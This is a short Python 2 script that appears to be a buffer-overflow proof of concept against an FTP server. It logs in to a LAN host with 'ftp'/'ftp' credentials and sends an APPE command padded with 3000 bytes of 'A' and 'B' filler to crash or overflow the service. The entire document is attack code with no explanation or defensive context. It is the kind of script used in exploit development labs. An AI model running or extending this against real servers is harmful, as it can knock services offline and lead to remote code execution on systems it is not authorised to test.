#!/usr/bin/python
 
from socket import *
import sys, struct, os, time
 
host = "192.168.1.11"
port = 21
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(2000)
time.sleep(2)
 
buffer = "A"*1000
buffer +="B"*2000
buffer += "\r\n"
 
print "[+] length: %d" % (len(buffer))
 
s.send('USER ftp\r\n')
print s.recv(2000)
s.send('PASS ftp\r\n')
print s.recv(2000)
s.send('APPE '+buffer)
print "[+]  sent!"

s.close()
